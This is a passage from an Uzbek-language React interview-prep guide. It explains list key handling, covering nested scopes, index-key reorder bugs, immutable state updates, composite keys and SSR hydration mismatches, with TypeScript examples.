Server va client'da bir xil key bo'lishi shart (hydration). Random key — mismatch.

```tsx
// ❌ SSR mismatch
function Logs() {
  return logs.map(() => <p key={Math.random()}>...</p>);
  // Server: key=0.123
  // Client: key=0.456
  // Hydration error
}

// ✅ Stable
function Logs() {
  return logs.map((log) => <p key={log.id}>...</p>);
}
```

**Key on non-list element:**

```tsx
// ✅ Conditional remount via key
<UserProfile key={userId} userId={userId} />
// userId change → full remount, state reset
```

Bu intentional pattern — key change orqali remount.

</details>

### Edge Cases

- **`key={null}`/`key={undefined}`**: No key, warning, fallback to index.
- **Same key in nested lists**: Outer list keys vs inner list keys — alohida scope, no conflict.
- **Boolean key**: `key={true}` — converted to `"true"` (collisions with another boolean).

### Follow-up savollar

- "Test'da key qanday tekshirish?" — `react-test-renderer` orqali tree.toJSON()'da children'ning Fiber structure. Practical: ESLint rule.
- "List item delete — key qanday update bo'ladi?" — Reconciler key bilan match qilolmaydigan old fiber'larni unmount qiladi (DOM remove + cleanup).
- "Pre-rendering vs hydration key impact?" — Hydration paytida server va client trees match qilinadi key bo'yicha. Mismatch — fallback to client-only render (warning).

</details>

---

### 52. Nested lists keys va scope [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

Nested list'larda key — har **darajada alohida scope**. Outer list item'lari unique key (sibling'lar orasida), inner list item'lari ham alohida unique. Outer va inner key'lar bir-biriga ta'sir qilmaydi (different sibling sets). Common pattern: outer list iterate qilib, ichida inner list iterate qilish — har biri o'z key bilan.

### To'liq tushuntirish

**Key scope qoidasi:**

Key faqat **immediate siblings** orasida unique bo'lishi shart. Different parent — alohida scope.

```tsx
<div>
  <ul>
    <li key="a">A1</li>  {/* ul siblings: a, b */}
    <li key="b">B1</li>
  </ul>
  <ol>
    <li key="a">A2</li>  {/* ol siblings: a, b — alohida scope */}
    <li key="b">B2</li>
  </ol>
</div>
```

### Kod misoli

```tsx
interface Category {
  id: string;
  name: string;
  products: Product[];
}

interface Product {
  id: string;
  name: string;
  price: number;
}

// ✅ Nested lists — har daraja o'z key
function CatalogView({ categories }: { categories: Category[] }) {
  return (
    <div>
      {categories.map((category) => (
        <section key={category.id}>  {/* outer key */}
          <h2>{category.name}</h2>
          <ul>
            {category.products.map((product) => (
              <li key={product.id}>  {/* inner key — alohida scope */}
                {product.name} — ${product.price}
              </li>
            ))}
          </ul>
        </section>
      ))}
    </div>
  );
}
```

**Output structure:**

```html
<div>
  <section>  <!-- key="cat-1" -->
    <h2>Electronics</h2>
    <ul>
      <li>Phone</li>  <!-- key="prod-1" -->
      <li>Laptop</li> <!-- key="prod-2" -->
    </ul>
  </section>
  <section>  <!-- key="cat-2" -->
    <h2>Clothing</h2>
    <ul>
      <li>Shirt</li>  <!-- key="prod-1" — OK, alohida ul ichida -->
      <li>Jeans</li>  <!-- key="prod-3" -->
    </ul>
  </section>
</div>
```

**Sub-component bilan:**

```tsx
function CategoryView({ category }: { category: Category }) {
  return (
    <section>
      <h2>{category.name}</h2>
      <ul>
        {category.products.map((product) => (
          <li key={product.id}>{product.name}</li>
        ))}
      </ul>
    </section>
  );
}

function CatalogView({ categories }: { categories: Category[] }) {
  return (
    <div>
      {categories.map((category) => (
        <CategoryView key={category.id} category={category} />
      ))}
    </div>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Reconciliation per-level:**

```typescript
// Outer list
old = [Fiber(category="cat-1"), Fiber(category="cat-2")]
new = [Element(category="cat-1"), Element(category="cat-2")]

Reconciler:
  matchByKey("cat-1", "cat-1") → reuse fiber
    Inner list — alohida reconciliation:
    old = [Fiber(product="prod-1"), Fiber(product="prod-2")]
    new = [Element(product="prod-1"), Element(product="prod-2")]
    matchByKey("prod-1", "prod-1") → reuse
    ...
```

**Common pitfalls:**

```tsx
// ❌ Forgot inner key
{categories.map((category) => (
  <section key={category.id}>
    <ul>
      {category.products.map((product) => (
        <li>{product.name}</li>  // ⚠️ no key warning
      ))}
    </ul>
  </section>
))}

// ❌ Index in nested
{categories.map((category, ci) => (
  <section key={ci}>  // ⚠️ index
    {category.products.map((product, pi) => (
      <li key={pi}>{product.name}</li>  // ⚠️ index
    ))}
  </section>
))}
// Reorder bug at both levels

// ✅ Stable IDs at each level
{categories.map((category) => (
  <section key={category.id}>
    {category.products.map((product) => (
      <li key={product.id}>{product.name}</li>
    ))}
  </section>
))}
```

**Fragment in nested:**

```tsx
{users.map((user) => (
  <Fragment key={user.id}>
    {user.posts.map((post) => (
      <article key={post.id}>{post.title}</article>
    ))}
  </Fragment>
))}
```

**Cross-level uniqueness pattern:**

```tsx
// Sometimes useful — cross-level unique key
{flattenedItems.map((item) => (
  <Card key={`${item.categoryId}-${item.productId}`} item={item} />
))}
// Used when flatten array, items from different categories
```

**Performance — nested list:**

```typescript
// Reconciler complexity
// Outer list: O(n) where n = categories.length
// Each category: inner list O(m) where m = products.length
// Total: O(n * m)

// Without keys at any level: index-based, O(n * m) but bug-prone
// With keys: stable identity, optimal moves
```

**`React.memo` on nested list items:**

```tsx
const ProductItem = memo(({ product }: { product: Product }) => (
  <li>{product.name}</li>
));

function CategoryView({ category }: { category: Category }) {
  return (
    <ul>
      {category.products.map((product) => (
        <ProductItem key={product.id} product={product} />
      ))}
    </ul>
  );
}
// memo + stable keys — bailout on unchanged items
```

</details>

### Edge Cases

- **Same item in different categories**: Cross-level scope — different list, OK to have same key.
- **Flat list of nested data**: Composite key (`${parentId}-${childId}`) tavsiya.
- **Map vs forEach**: `forEach` JSX'da ishlamaydi — `.map()` ishlatish (return JSX array).

### Follow-up savollar

- "Tree (recursive) komponent key strategy?" — Recursive component'da har node'ning unique ID (path bo'yicha hisoblansa ham).
- "Virtualized list key?" — `react-window` / TanStack Virtual o'zi key boshqaradi (visible items only).
- "Nested DnD?" — Library (dnd-kit) har list o'z context bilan ishlaydi — keys per list.

</details>

---

### 53. Output: index as key bilan reorder bug [Output] [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi kod nima qiladi va user input keyin "Sort" tugmasi bosilsa nima sodir bo'ladi?

```tsx
function SortableList() {
  const [items, setItems] = useState([
    { id: 1, name: "Bob" },
    { id: 2, name: "Alice" },
    { id: 3, name: "Charlie" },
  ]);

  return (
    <div>
      <button onClick={() => setItems([...items].sort((a, b) => a.name.localeCompare(b.name)))}>
        Sort by name
      </button>
      <ul>
        {items.map((item, i) => (
          <li key={i}>
            <span>{item.name}: </span>
            <input defaultValue="" placeholder="Comment" />
          </li>
        ))}
      </ul>
    </div>
  );
}

// Steps:
// 1. User types "First" in Bob's input
// 2. User types "Second" in Alice's input
// 3. User types "Third" in Charlie's input
// 4. User clicks "Sort by name"
```

### Javob

**Sort'dan keyin output (BUGGY):**

```
Alice: First         ← input "First" Bob's edi, Alice'ga ko'chdi
Bob: Second          ← input "Second" Alice's edi, Bob'ga ko'chdi
Charlie: Third       ← OK (oxirida hech qachon)
```

**Sabab**: `key={i}` — index based. Sort items'ni reorder qilgandan keyin:

- Old: `[items[0]=Bob, items[1]=Alice, items[2]=Charlie]`, keys=`[0, 1, 2]`
- After sort: `[items[0]=Alice, items[1]=Bob, items[2]=Charlie]`, keys=`[0, 1, 2]`

Reconciler: `key=0` old fiber → `key=0` new fiber (same fiber, props update). Input — uncontrolled, DOM input.value preserved. So:

- Position 0 (was Bob with "First") — same fiber, now shows "Alice" but `<input>` still has "First"
- Position 1 (was Alice with "Second") — same fiber, now shows "Bob" but `<input>` still has "Second"

**Fix:**

```tsx
{items.map((item) => (
  <li key={item.id}>  {/* ✅ Stable ID */}
    <span>{item.name}: </span>
    <input defaultValue="" placeholder="Comment" />
  </li>
))}
```

After sort with `key={item.id}`:
- Old: keys=`[1, 2, 3]` (Bob's input has "First")
- New: keys=`[2, 1, 3]` (after sort: Alice id=2, Bob id=1, Charlie id=3)
- Reconciler: each fiber moves to correct position with state attached

```
Alice: Second        ← input follows Alice
Bob: First           ← input follows Bob
Charlie: Third       ← OK
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Step-by-step Reconciler trace:**

**Initial state (after typing):**

```
Fiber tree (initial):
[
  Fiber(li, key=0, child=Fiber(input, value="First")),
  Fiber(li, key=1, child=Fiber(input, value="Second")),
  Fiber(li, key=2, child=Fiber(input, value="Third"))
]

DOM:
<li>
  <span>Bob: </span>
  <input value="First">
</li>
<li>
  <span>Alice: </span>
  <input value="Second">
</li>
<li>
  <span>Charlie: </span>
  <input value="Third">
</li>
```

**After sort, render produces new elements:**

```
New elements:
[
  Element(li, key=0, props={children: [<span>Alice:</span>, <input>]}),
  Element(li, key=1, props={children: [<span>Bob:</span>, <input>]}),
  Element(li, key=2, props={children: [<span>Charlie:</span>, <input>]})
]
```

**Reconciler diff:**

```typescript
// Match by key:
// key=0: oldFiber found, reuse → props update (span text "Bob" → "Alice")
// key=1: oldFiber found, reuse → props update (span text "Alice" → "Bob")
// key=2: oldFiber found, reuse → no change (Charlie still Charlie)
```

**Resulting DOM:**

```
<li>  <!-- same fiber as key=0, span updated, input UNTOUCHED -->
  <span>Alice: </span>
  <input value="First">  ← old value preserved
</li>
<li>  <!-- same fiber as key=1, span updated, input UNTOUCHED -->
  <span>Bob: </span>
  <input value="Second">  ← old value preserved
</li>
<li>  <!-- same fiber as key=2, no change -->
  <span>Charlie: </span>
  <input value="Third">
</li>
```

**Why `<input>` value preserved:**

`<input defaultValue="">` — uncontrolled. DOM owns the value. React doesn't touch input.value during update (defaultValue applies only at mount). Fiber preserved → DOM input preserved → user input preserved (in wrong row).

**Fix with stable ID:**

```typescript
// items reordered, but key bo'yicha:
// new[0].key = 2 (Alice)
// new[1].key = 1 (Bob)
// new[2].key = 3 (Charlie)

// Reconciler:
// new[0] (key=2) → match oldFiber(key=2) which had Alice
//   → MOVE fiber from position 1 to 0 (DOM moveBefore)
//   → input value "Second" moves with it
// new[1] (key=1) → match oldFiber(key=1) which had Bob
//   → MOVE from position 0 to 1
//   → input value "First" moves with it
// new[2] (key=3) → match oldFiber(key=3) — no move
//   → input value "Third" stays
```

**Visual result with stable ID:**

```
Alice: Second  ← Alice's row moved with her input
Bob: First     ← Bob's row moved with his input
Charlie: Third
```

**Controlled input — same bug:**

```tsx
const [comments, setComments] = useState<Record<number, string>>({});

{items.map((item, i) => (
  <li key={i}>
    <span>{item.name}: </span>
    <input
      value={comments[item.id] ?? ""}
      onChange={(e) => setComments({...comments, [item.id]: e.target.value})}
    />
  </li>
))}
```

Bunda controlled input — value `comments[item.id]`'ga bog'liq. Sort qilingach, item position o'zgaradi, lekin `comments[item.id]` to'g'ri (item.id stable). Index key bilan ham bug yo'q? Almost — fiber update'da `value` prop o'zgaradi (yangi value), DOM input.value React majburlaydi. So controlled — protected.

Lekin focus, scroll position, animation state — hali ham buzilishi mumkin (component-level state).

**`useState` ichida hooks state pollution:**

```tsx
function ItemRow({ item }: { item: Item }) {
  const [editing, setEditing] = useState(false);
  return <li>{editing ? <input /> : item.name}</li>;
}

{items.map((item, i) => <ItemRow key={i} item={item} />)}
```

Sort'dan keyin `editing` state position'ga bog'liq, item'ga emas. User Bob'ni edit qilgan bo'lsa, sort'dan keyin Alice'ni edit qilayotgan ko'rinadi.

</details>

### Edge Cases

- **`<input value="">` controlled with no state**: Read-only. React forces value to "" on every render — user input lost on each keystroke (frozen).
- **`<input defaultValue={item.name}>`**: defaultValue applies only at mount. After reorder with index key — DOM value stays from initial mount.
- **Animation state (Framer Motion)**: Animation tied to fiber identity. Index key + reorder → animation glitches.

### Follow-up savollar

- "Bug'ni topish uchun debugging strategy?" — DevTools Components tab — fiber tree va keys ko'rinadi. Inspect reordering — fibers preserved or remounted?
- "ESLint rule index'ni warn qiladi-mi?" — `react/no-array-index-key` — index'ni warning. Lekin static list'lar uchun ham warn qiladi (false positive).
- "Test'da bug'ni qanday catch qilish?" — RTL `userEvent.type(input)`, sort, then `expect(input.value)` — order-dependent assertion.

</details>

---

### 54. Bug fix: kod nima xato? — list rendering anti-pattern [Bug Fix] [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi kod ishlaydi, lekin bir nechta muammolarga ega. Topish va tuzatish:

```tsx
function TodoApp() {
  const [todos, setTodos] = useState([]);
  const [text, setText] = useState("");

  const addTodo = () => {
    todos.push({ text, done: false });
    setTodos(todos);
  };

  const toggleTodo = (todo) => {
    todo.done = !todo.done;
    setTodos(todos);
  };

  return (
    <div>
      <input value={text} onChange={(e) => setText(e.target.value)} />
      <button onClick={addTodo}>Add</button>
      <ul>
        {todos.map((todo, i) => (
          <li onClick={() => toggleTodo(todo)}>
            {todo.done ? "✓" : "○"} {todo.text}
          </li>
        ))}
      </ul>
    </div>
  );
}
```

### Javob

**Topilgan muammolar:**

1. **❌ State mutation** — `todos.push(...)` direct mutate. React Object.is comparison bilan reference o'zgarmaganini ko'radi → bailout, no re-render.

2. **❌ State mutation #2** — `todo.done = !todo.done` — item mutate. Same reference, no re-render.

3. **❌ Missing `key`** — `<li>` key'siz, ESLint warning + suboptimal reconciliation.

4. **❌ `useState([])` TypeScript** — `never[]` inferred, `todos.push({text, done})` type error.

5. **❌ Closure trap (potential)** — `addTodo` `text` closure'ga bog'liq, OK lekin doim re-create function.

**Tuzatilgan kod:**

```tsx
interface Todo {
  id: string;
  text: string;
  done: boolean;
}

function TodoApp() {
  const [todos, setTodos] = useState<Todo[]>([]);  // ✅ Type
  const [text, setText] = useState("");

  const addTodo = () => {
    if (!text.trim()) return;
    setTodos((prev) => [
      ...prev,  // ✅ Immutable update
      { id: crypto.randomUUID(), text, done: false }  // ✅ Stable ID
    ]);
    setText("");
  };

  const toggleTodo = (id: string) => {
    setTodos((prev) =>
      prev.map((todo) =>
        todo.id === id
          ? { ...todo, done: !todo.done }  // ✅ Immutable
          : todo
      )
    );
  };

  return (
    <div>
      <input
        value={text}
        onChange={(e) => setText(e.target.value)}
        onKeyDown={(e) => e.key === "Enter" && addTodo()}
      />
      <button onClick={addTodo} disabled={!text.trim()}>Add</button>
      <ul>
        {todos.map((todo) => (
          <li key={todo.id} onClick={() => toggleTodo(todo.id)}>  {/* ✅ Key */}
            {todo.done ? "✓" : "○"} {todo.text}
          </li>
        ))}
      </ul>
    </div>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Bug 1: Direct array mutation:**

```tsx
const addTodo = () => {
  todos.push({ text, done: false });  // ❌ same array reference
  setTodos(todos);  // setState with same reference
};
```

`setTodos(todos)` — React's `Object.is(prevTodos, newTodos)` returns `true` (same reference). React thinks state didn't change → no re-render.

UI shows old list. `todos.push` did mutate, but UI doesn't reflect.

**Bug 2: Item mutation:**

```tsx
const toggleTodo = (todo) => {
  todo.done = !todo.done;  // ❌ mutating item
  setTodos(todos);  // same array reference
};
```

Same problem. Plus: violates React's immutability invariant for state.

**Bug 3: Missing key:**

```tsx
{todos.map((todo, i) => (
  <li onClick={...}>
    {todo.done ? "✓" : "○"} {todo.text}
  </li>
))}
// React warning: "Each child in a list should have a unique 'key' prop."
```

Without key: React falls back to index-based reconciliation (suboptimal, bug-prone with reorder).

**Bug 4: TypeScript:**

```tsx
const [todos, setTodos] = useState([]);
// TS infers: todos: never[]
todos.push({ text, done: false });  // ❌ Type 'object' is not assignable to type 'never'
```

Fix: explicit type annotation.

**Bug 5 (subtle): Race condition with closure:**

```tsx
const addTodo = () => {
  setTodos([...todos, { text, done: false }]);  // closure todos
};

// User clicks Add twice quickly:
// Click 1: setTodos([t1]) — schedules render
// Click 2: setTodos([t1])  ← OLD todos! (haven't re-rendered yet)
// Result: only 1 item added (race lost)

// ✅ Functional update — always latest
const addTodo = () => {
  setTodos((prev) => [...prev, { text, done: false }]);
};
```

**Functional update — always sees latest state:**

```typescript
// React internal:
const dispatch = (action) => {
  enqueueUpdate(action);  // queue order'da bajariladi
  scheduleUpdate();
};

// Render time:
// state = old
// for each update in queue:
//   if (typeof update === "function") state = update(state);  // ← latest
//   else state = update;
```

**Performance: stable callbacks:**

```tsx
// ❌ Every render creates new toggleTodo
const toggleTodo = (id: string) => {
  setTodos((prev) => prev.map(...));
};

// ✅ useCallback (or React Compiler auto-memo)
const toggleTodo = useCallback((id: string) => {
  setTodos((prev) => prev.map((todo) => todo.id === id ? {...todo, done: !todo.done} : todo));
}, []);
```

With `useCallback` — `toggleTodo` reference stable. Memoized child components don't re-render when toggleTodo "changes".

**Immer alternative (immutability easier):**

```tsx
import { produce } from "immer";

const toggleTodo = (id: string) => {
  setTodos(produce((draft) => {
    const todo = draft.find((t) => t.id === id);
    if (todo) todo.done = !todo.done;  // looks like mutation, but produces new array
  }));
};
```

Immer uses Proxy to track "mutations" and produces new immutable state.

**Test'larda bug aniqlash:**

```tsx
test("toggleTodo updates UI", () => {
  render(<TodoApp />);

  // Add todo
  userEvent.type(screen.getByRole("textbox"), "Buy milk");
  userEvent.click(screen.getByText("Add"));

  // Click to toggle
  userEvent.click(screen.getByText(/Buy milk/));

  // Should show check mark
  expect(screen.getByText(/✓/)).toBeInTheDocument();
});
// With buggy code: test fails because UI doesn't update
```

**TypeScript catches mutation:**

```typescript
// readonly type prevents mutation
const todos: ReadonlyArray<Todo> = [...];
todos.push({...});  // ❌ TS error: Property 'push' does not exist on readonly array
```

</details>

### Edge Cases

- **`prev` parameter null**: `setTodos(prev => ...)` — React kafolat'da `prev` joriy state. Initial value (initial state) bo'lsa ham value (not null).
- **Updater returning same reference**: `setTodos(prev => prev)` — Object.is bailout, no re-render. Safe optimization.
- **Async updater**: `setTodos(async prev => ...)` — ❌ updater pure va sync bo'lishi shart.

### Follow-up savollar

- "Production'da mutation bug'ni qanday topish?" — Strict Mode 2x render — mutation bug'lar exposed (state inconsistency). DevTools "Highlight Updates" — re-render trigger ko'rinadi.
- "Immer ishlatish kerakmi default?" — Optional. Vanilla immutability OK simple list/object. Immer chuqur nested data uchun (form, complex state).
- "useReducer todo bilan?" — Yana yaxshi pattern. Action types: ADD, TOGGLE, DELETE. Mutation bug yo'q (reducer pure).

</details>

---

### 55. `key` prop child component'da olinadi-mi (`props.key`)? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

`key` prop **child component'ga uzatilmaydi** — `props.key` har doim `undefined`. `key` — React'ning **internal Reconciler hint'i** (sibling identity uchun), oddiy prop emas. Agar child'ga shu value kerak bo'lsa — alohida prop nomi bilan uzatish kerak (`itemKey`, `id`).

### To'liq tushuntirish

**`key` special prop:**

```tsx
// ❌ Component ichida key olib bo'lmaydi
function Item({ key, name }: { key: string; name: string }) {
  console.log(key);  // undefined!
  return <li>{name}</li>;
}

{items.map((item) => (
  <Item key={item.id} name={item.name} />
))}
```

### Kod misoli

```tsx
interface MovieCardProps {
  movieId: string;  // ← shu prop child'da o'qiladi
  title: string;
}

function MovieCard({ movieId, title }: MovieCardProps) {
  return <div data-id={movieId}>{title}</div>;
}

{movies.map((movie) => (
  <MovieCard
    key={movie.id}        // ← Reconciler uchun
    movieId={movie.id}    // ← Component uchun (alohida)
    title={movie.title}
  />
))}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**React internal — key extraction:**

```typescript
// _jsx implementation (R19, sodda)
function jsx(type, config, maybeKey) {
  let key = null;
  if (maybeKey !== undefined) {
    key = "" + maybeKey;
  }

  const props = {};
  for (const propName in config) {
    if (propName !== "key") {  // ← key skip qilinadi props'ga
      props[propName] = config[propName];
    }
  }

  return {
    $$typeof: REACT_ELEMENT_TYPE,
    type,
    key,         // ← Element'da alohida field
    ref: props.ref ?? null,
    props,       // ← key YO'Q bu yerda
  };
}
```

**Why key is special:**

`key` — React'ning Reconciler signal'i, sibling identity match qilish uchun. Child component'da bu value kerak emas (Reconciler ichki ishlatadi).

**Common bug — spread:**

```tsx
const itemProps = { key: "abc", id: "x", name: "Item" };
<Item {...itemProps} />
// JSX'da spread'dan key alohida ekstrakt EMAS
// Real behavior: Element.key = null, props.key = "abc"
// Warning: "Each child in a list should have a unique key prop"

// To'g'ri:
const { key, ...itemRest } = itemProps;
<Item key={key} {...itemRest} />
```

</details>

### Edge Cases

- **`key={undefined}`**: Default no key — index fallback warning.
- **`key={null}`**: Treated as no key (warning).
- **`key={0}`**: Stringified to "0" — valid.

### Follow-up savollar

- "What about ref — same special prop?" — R18: ref special (forwardRef wrapper). R19: ref oddiy prop, child'da `props.ref` access mumkin.
- "Can I expose key value to children?" — Use alohida prop (`itemKey`, `id`). React intentionally doesn't expose `key`.

</details>

---

### 56. Composite key strategy — yo'q ID list'da [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

Backend'dan kelayotgan list'da unique ID yo'q bo'lsa, **composite key** — bir nechta field'larni birlashtirib unique key yaratish: `${item.name}-${item.timestamp}`. **Frontend UUID** — `crypto.randomUUID()` mount paytida (state'da saqlash kerak, har render emas). Best: backend'dan ID so'rash. Compromise: composite key + collision check.

### Kod misoli

```tsx
// 1. Composite key — multiple fields
interface Message {
  userId: string;
  text: string;
  timestamp: number;
}

function MessageList({ messages }: { messages: Message[] }) {
  return messages.map((msg) => (
    <Message
      key={`${msg.userId}-${msg.timestamp}`}
      msg={msg}
    />
  ));
}

// 2. Frontend UUID generation — store in state
function TodoList() {
  const [todos, setTodos] = useState<Array<{ id: string; text: string }>>([]);

  const addTodo = (text: string) => {
    setTodos((prev) => [
      ...prev,
      { id: crypto.randomUUID(), text },  // ← generated once, persisted
    ]);
  };

  return todos.map((todo) => (
    <Item key={todo.id} todo={todo} />
  ));
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**`crypto.randomUUID()` — generation pattern:**

```tsx
// ❌ Anti-pattern: generated each render
function BadList({ items }: { items: Item[] }) {
  return items.map((item) => (
    <Item key={crypto.randomUUID()} item={item} />  // new key each render!
  ));
}

// ✅ Generate once during transform
function GoodList({ data }: { data: any[] }) {
  const items = useMemo(
    () => data.map((d) => ({ ...d, _id: crypto.randomUUID() })),
    [data]  // re-generate only on data change
  );

  return items.map((item) => <Item key={item._id} item={item} />);
}

// ✅ Better: counter (no UUID overhead)
function CounterList() {
  const [items, setItems] = useState<Item[]>([]);
  const counterRef = useRef(0);

  const addItem = (text: string) => {
    setItems((prev) => [
      ...prev,
      { id: ++counterRef.current, text },
    ]);
  };

  return items.map((item) => <Item key={item.id} item={item} />);
}
```

**Object reference Map (WeakMap):**

```tsx
const idMap = new WeakMap<object, string>();
let counter = 0;

function getOrCreateId(obj: object): string {
  let id = idMap.get(obj);
  if (!id) {
    id = `obj-${++counter}`;
    idMap.set(obj, id);
  }
  return id;
}

{items.map((item) => (
  <Item key={getOrCreateId(item)} item={item} />
))}
// Same object → same key (stable across renders)
```

**Real-world pattern — chat messages:**

```tsx
interface ChatMessage {
  id?: string;       // server-assigned (after send)
  tempId: string;    // client-generated (immediate display)
  text: string;
  timestamp: number;
}

function ChatList({ messages }: { messages: ChatMessage[] }) {
  return messages.map((msg) => (
    <Message
      key={msg.id ?? msg.tempId}  // server ID preferred, fallback to temp
      msg={msg}
    />
  ));
}
```

</details>

### Edge Cases

- **Same content twice in list**: Hash key collides. Add index: `${hash}-${i}` — but breaks reorder.
- **Key changes during edit**: `${name}-${date}` — user edits name → key changes → fiber unmounts (state lost). Use stable ID.
- **Large composite keys**: `JSON.stringify(largeObj)` — slow, large memory. Hash or specific fields preferred.

### Follow-up savollar

- "When to demand backend ID?" — Production app — always. Backend ID is single source of truth, stable, indexable.
- "GraphQL `__typename` + ID composite?" — Common pattern: `key={\`${item.__typename}-${item.id}\`}` — handles polymorphic lists.

</details>

---

### 57. Server-rendered list — `crypto.randomUUID()` xavfi va to'g'ri pattern [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

SSR (Server-Side Rendering) paytida `crypto.randomUUID()`, `Math.random()`, `Date.now()` — **server va client'da farqli value** beradi → **hydration mismatch**. Server HTML key="abc", client render key="xyz" — React keylar mismatch deb hisoblaydi, full client-side re-render. To'g'ri pattern: backend ID, deterministik composite (`${author}-${date}`), yoki `useId` (R18+ — SSR-safe per-instance).

### To'liq tushuntirish

**Hydration mismatch sources:**

| Pattern | Issue | Fix |
|---------|-------|-----|
| `key={Math.random()}` | Server vs client farqli | Backend ID |
| `key={crypto.randomUUID()}` | Same | Backend ID yoki state'da generate |
| `key={Date.now()}` | Render time mismatch | Static composite |
| `id={Math.random()}` (form input) | Same | `useId` hook |

### Kod misoli

```tsx
// ❌ SSR mismatch
function ServerSideList({ items }: { items: Item[] }) {
  return items.map((item) => (
    <li key={crypto.randomUUID()}>{item.name}</li>
  ));
}
// Server HTML: <li>Item 1</li>  (React internal key="uuid-server-1")
// Client render: <li>Item 1</li>  (key="uuid-client-1")
// React: key mismatch → full re-render

// ✅ Stable backend ID
function GoodList({ items }: { items: Item[] }) {
  return items.map((item) => (
    <li key={item.id}>{item.name}</li>  // ← deterministic
  ));
}

// ✅ Composite key (deterministic from data)
function MessagesList({ messages }: { messages: Message[] }) {
  return messages.map((msg) => (
    <li key={`${msg.author}-${msg.timestamp}`}>{msg.text}</li>
  ));
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**`useId` — SSR-safe unique ID:**

```tsx
function FormField({ label }: { label: string }) {
  const id = useId();  // ✅ SSR-safe
  return (
    <div>
      <label htmlFor={id}>{label}</label>
      <input id={id} />
    </div>
  );
}

// Server: id=":r0:"
// Client: id=":r0:"  (same — based on tree position)
```

`useId` — Fiber tree position'iga asoslangan unique ID. SSR va client identical.

**`useId` for list keys — DOESN'T work:**

```tsx
// ❌ useId returns same value per component instance, can't be in loop
function BadList({ items }: { items: Item[] }) {
  return items.map((item) => {
    const id = useId();  // ❌ Rules of Hooks violation (in loop)
    return <li key={id}>{item.name}</li>;
  });
}
```

**`useEffect` pattern for client-only data:**

```tsx
function ClientOnlyTime() {
  const [time, setTime] = useState<string | null>(null);

  useEffect(() => {
    setTime(new Date().toLocaleString());
  }, []);

  return <p>Time: {time ?? "Loading..."}</p>;
}
// Server: <p>Time: Loading...</p>
// Client hydrate: <p>Time: Loading...</p>  (match!)
// useEffect: setTime → re-render with time
```

**`onRecoverableError` callback:**

```tsx
const root = hydrateRoot(container, <App />, {
  onRecoverableError: (error) => {
    if (error.message.includes("Hydration")) {
      analytics.track("hydration_mismatch", { url: location.pathname });
    }
  },
});
```

**Server Components hydration:**

```tsx
// Server Component — no hydration issue (no client render)
async function ServerList() {
  const items = await db.items.findMany();
  return (
    <ul>
      {items.map((item) => (
        <li key={item.id}>{item.name}</li>  // backend ID — stable
      ))}
    </ul>
  );
}
```

RSC — server-only, no hydration mismatch (no client render).

</details>

### Edge Cases

- **`useId` in conditional**: Rules of Hooks violation. `useId` always at top.
- **`Date.now()` in JSX text**: Hydration mismatch. Use `useEffect` to set client time.
- **Browser-only API**: `window.innerWidth` in render — server `window` undefined. Use `typeof window !== "undefined"` or `useEffect`.

### Follow-up savollar

- "Why doesn't React just regenerate keys client-side?" — Hydration is for fast initial paint. Re-render entire tree defeats SSR purpose.
- "Can I use server-generated UUIDs that change?" — Yes, but next render server may produce different. Stable backend storage required.

</details>

---

### 58. `filter().map()` chain — key strategy [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

`array.filter().map()` chain — filter'dan keyin map'ga uzatilgan element'lar **original index'ni saqlamaydi** (filter natijasi yangi array). Index-as-key bilan `filter().map((item, i) => <Item key={i} />)` — bug-prone (filter conditional reorder qiladi). Stable ID afzal: `filter().map((item) => <Item key={item.id} />)`. Index ishlatilsa — filter'dan oldin (lekin filter natijasi index'ga teng emas).

### To'liq tushuntirish

**Filter index trap:**

```tsx
// ❌ Index-as-key + filter
function FilteredList({ items, query }: { items: Item[]; query: string }) {
  return items
    .filter((item) => item.name.includes(query))
    .map((item, i) => (
      <li key={i}>{item.name}</li>  // ← filter'dan keyin index — yangi
    ));
}

// items: [A(id=1), B(id=2), C(id=3)]
// query "A" → filter result: [A], keys: [0]
// query "" → filter result: [A, B, C], keys: [0, 1, 2]
// User input "" → "" (clear) → A's component reused (same key=0)
//   B becomes key=1 (was C with key=2)
//   Reconciler confusion if components have state
```

**Solutions:**

```tsx
// ✅ Stable ID
function GoodFilteredList({ items, query }: { items: Item[]; query: string }) {
  return items
    .filter((item) => item.name.includes(query))
    .map((item) => (
      <li key={item.id}>{item.name}</li>  // ← stable
    ));
}

// ✅ Or original index (saved before filter)
function WithOriginalIndex({ items, query }: { items: Item[]; query: string }) {
  return items
    .map((item, originalIndex) => ({ ...item, originalIndex }))
    .filter((item) => item.name.includes(query))
    .map((item) => (
      <li key={item.originalIndex}>{item.name}</li>  // ← original
    ));
}
```

### Kod misoli

```tsx
// Real-world: filter + sort + map
interface Product {
  id: string;
  name: string;
  price: number;
  category: string;
}

function ProductList({
  products,
  category,
  sortBy
}: {
  products: Product[];
  category: string;
  sortBy: "price" | "name";
}) {
  const filtered = products.filter((p) => p.category === category);
  const sorted = [...filtered].sort((a, b) => {
    if (sortBy === "price") return a.price - b.price;
    return a.name.localeCompare(b.name);
  });

  return (
    <ul>
      {sorted.map((product) => (
        <li key={product.id}>  {/* ✅ Stable */}
          {product.name} — ${product.price}
        </li>
      ))}
    </ul>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Why filter changes indices:**

```typescript
const items = [
  { id: "a", value: 1 },
  { id: "b", value: 2 },
  { id: "c", value: 3 },
];

// filter
const filtered = items.filter((i) => i.value > 1);
// [{id: "b", value: 2}, {id: "c", value: 3}]
// indices: [0, 1]  ← yangi indices, ID match emas

// map with index
filtered.map((item, i) => ({ key: i, item }));
// [{ key: 0, item: b }, { key: 1, item: c }]
```

**Reconciler bug demo:**

```tsx
function ComponentWithState({ value }: { value: number }) {
  const [count, setCount] = useState(value);  // local state
  return (
    <button onClick={() => setCount(c => c + 1)}>
